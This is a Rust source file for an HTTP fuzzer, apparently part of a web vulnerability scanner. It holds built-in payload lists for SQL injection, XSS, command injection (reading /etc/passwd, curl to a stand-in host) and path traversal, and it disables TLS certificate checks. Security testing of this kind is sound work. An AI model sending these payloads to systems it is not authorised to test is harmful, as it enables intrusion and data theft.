//! HTTP Fuzzer
//!
//! Specialized fuzzer for HTTP/HTTPS endpoints with payload generation.

use std::collections::HashMap;
use tokio::time::Duration;
use chrono::Utc;
use rand::prelude::*;
use reqwest::{Client, Method, header};

use crate::fuzzing::types::*;
use crate::fuzzing::generators::InputGenerator;

/// HTTP fuzzing position
#[derive(Debug, Clone, PartialEq)]
pub enum FuzzPosition {
    Path,
    QueryParam(String),
    Header(String),
    Cookie(String),
    Body,
    JsonField(String),
}

/// HTTP fuzzer for web applications
pub struct HttpFuzzer {
    client: Client,
    generator: InputGenerator,
}

impl HttpFuzzer {
    /// Create a new HTTP fuzzer
    pub fn new() -> Self {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .danger_accept_invalid_certs(true)
            .redirect(reqwest::redirect::Policy::limited(5))
            .build()
            .unwrap_or_default();

        Self {
            client,
            generator: InputGenerator::new(),
        }
    }

    /// Fuzz an HTTP endpoint
    pub async fn fuzz(
        &self,
        base_url: &str,
        method: &str,
        positions: &[FuzzPosition],
        payloads: Option<&[FuzzDataType]>,
        headers: Option<&HashMap<String, String>>,
        iterations: u64,
    ) -> Vec<HttpFuzzResult> {
        let mut results = Vec::new();
        let mut rng = rand::thread_rng();

        let payload_types = payloads.unwrap_or(&[
            FuzzDataType::String,
            FuzzDataType::SqlInjection,
            FuzzDataType::XssPayload,
            FuzzDataType::CommandInjection,
            FuzzDataType::Path,
        ]);

        let http_method = match method.to_uppercase().as_str() {
            "GET" => Method::GET,
            "POST" => Method::POST,
            "PUT" => Method::PUT,
            "DELETE" => Method::DELETE,
            "PATCH" => Method::PATCH,
            "HEAD" => Method::HEAD,
            "OPTIONS" => Method::OPTIONS,
            _ => Method::GET,
        };

        for i in 0..iterations {
            // Select random position and payload type
            let position = positions.choose(&mut rng).unwrap_or(&FuzzPosition::Body);
            let payload_type = payload_types.choose(&mut rng).unwrap_or(&FuzzDataType::String);

            // Generate payload
            let payload = self.generator.generate_value(payload_type, Some(1), Some(256));
            let payload_str = String::from_utf8_lossy(&payload).to_string();

            // Build request
            let mut url = base_url.to_string();
            let mut request_headers = HashMap::new();
            let mut body = None;

            // Apply payload to position
            match position {
                FuzzPosition::Path => {
                    url = format!("{}/{}", base_url.trim_end_matches('/'), payload_str);
                }
                FuzzPosition::QueryParam(param) => {
                    let separator = if url.contains('?') { "&" } else { "?" };
                    url = format!("{}{}{}={}", url, separator, param, urlencoding::encode(&payload_str));
                }
                FuzzPosition::Header(name) => {
                    request_headers.insert(name.clone(), payload_str.clone());
                }
                FuzzPosition::Cookie(name) => {
                    request_headers.insert("Cookie".to_string(), format!("{}={}", name, payload_str));
                }
                FuzzPosition::Body => {
                    body = Some(payload.clone());
                }
                FuzzPosition::JsonField(field) => {
                    body = Some(format!(r#"{{"{}": "{}"}}"#, field, payload_str).into_bytes());
                    request_headers.insert("Content-Type".to_string(), "application/json".to_string());
                }
            }

            // Add custom headers
            if let Some(h) = headers {
                for (k, v) in h {
                    request_headers.entry(k.clone()).or_insert_with(|| v.clone());
                }
            }

            // Send request
            let start = std::time::Instant::now();
            let result = self.send_request(&url, &http_method, &request_headers, body.as_deref()).await;
            let elapsed = start.elapsed();

            results.push(HttpFuzzResult {
                iteration: i,
                url: url.clone(),
                method: method.to_string(),
                position: format!("{:?}", position),
                payload: payload_str,
                payload_type: format!("{:?}", payload_type),
                response: result,
                duration_ms: elapsed.as_millis() as u64,
            });

            // Small delay
            if i % 10 == 0 {
                tokio::time::sleep(Duration::from_millis(50)).await;
            }
        }

        results
    }

    /// Send HTTP request
    async fn send_request(
        &self,
        url: &str,
        method: &Method,
        headers: &HashMap<String, String>,
        body: Option<&[u8]>,
    ) -> HttpFuzzResponseResult {
        let mut request = self.client.request(method.clone(), url);

        // Add headers
        for (name, value) in headers {
            if let Ok(header_name) = header::HeaderName::try_from(name.as_str()) {
                if let Ok(header_value) = header::HeaderValue::from_str(value) {
                    request = request.header(header_name, header_value);
                }
            }
        }

        // Add body
        if let Some(b) = body {
            request = request.body(b.to_vec());
        }

        match request.send().await {
            Ok(response) => {
                let status = response.status().as_u16();
                let response_headers: HashMap<String, String> = response.headers()
                    .iter()
                    .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
                    .collect();

                let body = response.bytes().await.ok().map(|b| b.to_vec());

                HttpFuzzResponseResult::Success {
                    status_code: status,
                    headers: response_headers,
                    body_size: body.as_ref().map(|b| b.len()).unwrap_or(0),
                    body_preview: body.as_ref().map(|b| {
                        String::from_utf8_lossy(&b[..b.len().min(500)]).to_string()
                    }),
                }
            }
            Err(e) => {
                HttpFuzzResponseResult::Error {
                    message: e.to_string(),
                    is_timeout: e.is_timeout(),
                    is_connection_error: e.is_connect(),
                }
            }
        }
    }

    /// Generate SQL injection payloads
    pub fn generate_sqli_payloads(&self) -> Vec<String> {
        vec![
            // Basic tests
            "'".to_string(),
            "\"".to_string(),
            "'--".to_string(),
            "' OR '1'='1".to_string(),
            "' OR '1'='1'--".to_string(),
            "' OR 1=1--".to_string(),
            "1' ORDER BY 1--".to_string(),
            "1' ORDER BY 10--".to_string(),
            // Union based
            "' UNION SELECT NULL--".to_string(),
            "' UNION SELECT NULL,NULL--".to_string(),
            "' UNION SELECT NULL,NULL,NULL--".to_string(),
            // Error based
            "' AND 1=CONVERT(int,@@version)--".to_string(),
            "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
            // Time based
            "' AND SLEEP(5)--".to_string(),
            "'; WAITFOR DELAY '0:0:5'--".to_string(),
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--".to_string(),
            // Boolean based
            "' AND 1=1--".to_string(),
            "' AND 1=2--".to_string(),
            // Out of band
            "'; EXEC xp_cmdshell('nslookup test.local')--".to_string(),
        ]
    }

    /// Generate XSS payloads
    pub fn generate_xss_payloads(&self) -> Vec<String> {
        vec![
            // Basic
            "<script>alert(1)</script>".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            // Event handlers
            "<body onload=alert(1)>".to_string(),
            "<input onfocus=alert(1) autofocus>".to_string(),
            "<marquee onstart=alert(1)>".to_string(),
            // JavaScript URLs
            "javascript:alert(1)".to_string(),
            "<a href='javascript:alert(1)'>click</a>".to_string(),
            // Encoded
            "<script>alert(String.fromCharCode(88,83,83))</script>".to_string(),
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e".to_string(),
            // Template injection
            "{{constructor.constructor('alert(1)')()}}".to_string(),
            "${7*7}".to_string(),
            // DOM based
            "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),
            // Bypass attempts
            "<scr<script>ipt>alert(1)</scr</script>ipt>".to_string(),
            "<svg/onload=alert(1)>".to_string(),
            "\"><script>alert(1)</script>".to_string(),
        ]
    }

    /// Generate command injection payloads
    pub fn generate_cmdi_payloads(&self) -> Vec<String> {
        vec![
            // Unix
            "; id".to_string(),
            "| id".to_string(),
            "& id".to_string(),
            "|| id".to_string(),
            "&& id".to_string(),
            "`id`".to_string(),
            "$(id)".to_string(),
            "; cat /etc/passwd".to_string(),
            "| cat /etc/passwd".to_string(),
            "; ping -c 1 127.0.0.1".to_string(),
            // Windows
            "& dir".to_string(),
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts".to_string(),
            "& ping -n 1 127.0.0.1".to_string(),
            // Blind
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
            "& ping -n 5 127.0.0.1".to_string(),
            // Out of band
            "; nslookup test.local".to_string(),
            "; curl http://test.local".to_string(),
        ]
    }

    /// Generate path traversal payloads
    pub fn generate_path_traversal_payloads(&self) -> Vec<String> {
        vec![
            "../".to_string(),
            "../../".to_string(),
            "../../../".to_string(),
            "../../../../".to_string(),
            "../../../../../etc/passwd".to_string(),
            "..\\".to_string(),
            "..\\..\\".to_string(),
            "..\\..\\..\\windows\\system32\\config\\sam".to_string(),
            "%2e%2e%2f".to_string(),
            "%2e%2e/".to_string(),
            "..%2f".to_string(),
            "%252e%252e%252f".to_string(),
            "....//".to_string(),
            "..;/".to_string(),
            "/etc/passwd%00".to_string(),
            "....\\\\".to_string(),
        ]
    }

    /// Analyze results for potential vulnerabilities
    pub fn analyze_results(&self, results: &[HttpFuzzResult]) -> Vec<PotentialVulnerability> {
        let mut vulns = Vec::new();

        for result in results {
            if let HttpFuzzResponseResult::Success { status_code, body_preview, .. } = &result.response {
                let body = body_preview.as_deref().unwrap_or("");

                // SQL injection indicators
                if result.payload_type.contains("SqlInjection") {
                    if body.contains("SQL syntax") ||
                       body.contains("mysql_") ||
                       body.contains("ORA-") ||
                       body.contains("PostgreSQL") ||
                       body.contains("SQLite") ||
                       body.contains("ODBC") ||
                       body.contains("syntax error") {
                        vulns.push(PotentialVulnerability {
                            vuln_type: "SQL Injection".to_string(),
                            url: result.url.clone(),
                            position: result.position.clone(),
                            payload: result.payload.clone(),
                            evidence: body.chars().take(200).collect(),
                            confidence: if body.contains("syntax") { 0.9 } else { 0.7 },
                        });
                    }
                }

                // XSS indicators
                if result.payload_type.contains("Xss") {
                    if body.contains(&result.payload) {
                        vulns.push(PotentialVulnerability {
                            vuln_type: "Reflected XSS".to_string(),
                            url: result.url.clone(),
                            position: result.position.clone(),
                            payload: result.payload.clone(),
                            evidence: "Payload reflected in response".to_string(),
                            confidence: 0.8,
                        });
                    }
                }

                // Command injection indicators
                if result.payload_type.contains("CommandInjection") {
                    if body.contains("uid=") ||
                       body.contains("root:") ||
                       body.contains("bin/bash") ||
                       body.contains("Volume Serial") {
                        vulns.push(PotentialVulnerability {
                            vuln_type: "Command Injection".to_string(),
                            url: result.url.clone(),
                            position: result.position.clone(),
                            payload: result.payload.clone(),
                            evidence: body.chars().take(200).collect(),
                            confidence: 0.95,
                        });
                    }
                }

                // Path traversal indicators
                if result.payload_type.contains("Path") && result.payload.contains("..") {
                    if body.contains("root:x:0:0") ||
                       body.contains("[boot loader]") ||
                       body.contains("[extensions]") {
                        vulns.push(PotentialVulnerability {
                            vuln_type: "Path Traversal".to_string(),
                            url: result.url.clone(),
                            position: result.position.clone(),
                            payload: result.payload.clone(),
                            evidence: body.chars().take(200).collect(),
                            confidence: 0.95,
                        });
                    }
                }

                // Server errors might indicate issues
                if *status_code >= 500 {
                    vulns.push(PotentialVulnerability {
                        vuln_type: "Server Error".to_string(),
                        url: result.url.clone(),
                        position: result.position.clone(),
                        payload: result.payload.clone(),
                        evidence: format!("HTTP {}", status_code),
                        confidence: 0.5,
                    });
                }
            }
        }

        vulns
    }
}

impl Default for HttpFuzzer {
    fn default() -> Self {
        Self::new()
    }
}

/// HTTP fuzzing result
#[derive(Debug, Clone)]
pub struct HttpFuzzResult {
    pub iteration: u64,
    pub url: String,
    pub method: String,
    pub position: String,
    pub payload: String,
    pub payload_type: String,
    pub response: HttpFuzzResponseResult,
    pub duration_ms: u64,
}

/// HTTP response result
#[derive(Debug, Clone)]
pub enum HttpFuzzResponseResult {
    Success {
        status_code: u16,
        headers: HashMap<String, String>,
        body_size: usize,
        body_preview: Option<String>,
    },
    Error {
        message: String,
        is_timeout: bool,
        is_connection_error: bool,
    },
}

/// Potential vulnerability found
#[derive(Debug, Clone)]
pub struct PotentialVulnerability {
    pub vuln_type: String,
    pub url: String,
    pub position: String,
    pub payload: String,
    pub evidence: String,
    pub confidence: f64,
}
